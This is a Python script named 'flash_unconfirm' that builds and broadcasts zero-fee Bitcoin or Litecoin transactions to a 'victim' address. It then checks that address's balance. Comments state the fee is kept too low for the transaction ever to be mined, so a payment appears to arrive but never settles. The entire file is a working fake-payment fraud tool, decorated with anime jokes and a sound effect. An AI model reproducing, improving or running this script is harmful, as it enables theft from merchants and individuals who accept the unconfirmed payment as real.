import time
import argparse
import requests
import subprocess
import cryptos
import bitcoin
import blockcypher
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(description="How To Use flash_unconfirm")
parser.add_argument("send_from_wifkey",
                    help="Fake send btc from wif key.",
                    type=str)
parser.add_argument("fake_send_to",
                    help="Fake send btc to address.",
                    type=str)
parser.add_argument("blockcypher_token",
                    help="blockcypher_apikey  It might be possible to do it successfully with BTC.",
                    type=str)
parser.add_argument("currency",
                    help="Coin currency.  btc, ltc (Default=btc)",
                    type=str,
                    default="btc")
parser.add_argument("amount_of_coins",
                    help="Amount of coins sent. The maximum amount delayed will vary depending on send_from.",
                    type=float)
def to_satoshi(btc_amount):
    satoshi = 0.00000001
    return round(btc_amount / satoshi)

def broadcast_transaction(raw_tx, testnet):

    url = "https://live.blockcypher.com/btc/pushtx"
    res = requests.get(url).text
    bs = BeautifulSoup(res, 'html.parser')
    csrf_token = bs.find(attrs={'name':'csrfmiddlewaretoken'}).get('value')
    print(csrf_token)
    if testnet:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payload = raw_tx
        payload = {"tx_hex": raw_tx,
               "coin_symbol": "btc-testnet",
               "csrfmiddlewaretoken": csrf_token}
    else:
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}
        payload = {"tx_hex": raw_tx,
               "coin_symbol": "btc",
               "csrfmiddlewaretoken": csrf_token}

    response = requests.post(url,
                             allow_redirects=True,
                             data=payload,
                             headers=headers)
    print(f"response url : {response.url}")
    if response.status_code == 200:
        print("Transaction successfully broadcasted!")
    else:
        print(f"Failed to broadcast transaction. Status code: {response.status_code}")



args = parser.parse_args()
fake_send_from   = args.send_from_wifkey
victim_address   = args.fake_send_to
amount_btc  = args.amount_of_coins
token       = args.blockcypher_token
coin_symbol = args.currency
testnet     = False

print(testnet)
transaction_util = cryptos.Bitcoin(testnet=testnet)
if "ltc" in coin_symbol:
    print("litecoin")
    transaction_util = cryptos.Litecoin(testnet=testnet)
    sender  = transaction_util.privtopub(fake_send_from)
    address = transaction_util.pubtoaddr(sender)
    print(address)
    balance = transaction_util.get_balance(address)
    inputs  = transaction_util.get_unspents(address)
else:
    balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))
    inputs  = transaction_util.unspent(transaction_util.wiftoaddr(fake_send_from))
    balance = transaction_util.get_balance(transaction_util.wiftoaddr(fake_send_from))

print("OK")
print(balance)
if balance["confirmed"] <= 0:
    balance = balance["unconfirmed"]
else:
    balance = balance["confirmed"]

send_amount = to_satoshi(amount_btc)

if balance < send_amount:
    print(f"[!] insufficient funds. ")
    exit()

fee = 0 # ここはマインングできないくらい著しく小さな値にすることが重要。

change_btc_amt = (balance - send_amount) - fee #おつり

tx_victim = [{"address": victim_address, "value": send_amount}, {"address": sender, "value": change_btc_amt}]

tx_victim = transaction_util.mktx_with_change(inputs, tx_victim, fee=fee)
tx_victim = cryptos.serialize(transaction_util.sign(tx_victim, 0, fake_send_from))

print(inputs)
print()
print()
print("--------------------")
print(f"Fake Send to                       : {victim_address}")
print(f"Fake Send Amount (Satoshi unit)    : {send_amount} Satoshi")
print(f"Signed  RawTx             : {tx_victim}")
print(f"Currency                  : {coin_symbol.upper()}")
print(f"Testnet Mode              : {testnet}")
print("--------------------")
print()
print()

print()
input(" --- If you really want to continue, press enter. --- ")
print()
print()
print()
print()
print("Index > 強固なブロックチェーン技術に対して強制干渉を開始...")
print()
time.sleep(3) #詠唱中...  -u- 

print("SND TMP ITX TOBC  (ブロックチェーンに一時的な不正なトランザクションを送信!)")
time.sleep(2)

transaction_util.pushtx(tx_victim)
print()
print("OK")
#txid = transaction_util.send(fake_send_from, transaction_util.wiftoaddr(fake_send_from), victim_address, send_amount, fee=0)
#print(txid)
#print(blockcypher.pushtx(tx_victim,
#                coin_symbol=coin_symbol,
#                api_key=token))
#

#transaction_util.pushtx(tx_victim)
#broadcast_transaction(tx_victim, testnet)
#おまけ
print()
print()
print("Kamijou Touma >> Kill that blockchain transaction!! 👊 💥 ")
print()
print()
sound_name = "ImagineBreaker.mp3"
try:
    import soundplay
    soundplay.playsound(sound_name)
except:
    try:
        imagine_breaker_cmd = ["cvlc", "--play-and-exit", sound_name]
        subprocess.run(imagine_breaker_cmd)
    except:
        pass
time.sleep(1)

print("----------------")
balance = blockcypher.get_total_balance(victim_address)
print(f"victim : {victim_address}")
print(f"fake send to address Balance (satoshi unit) :{balance}")
print()
print("Tips : If you are unable to send from the program side, why not try sending manually using the service at the following URL?: https://live.blockcypher.com/pushtx")
print("Done.")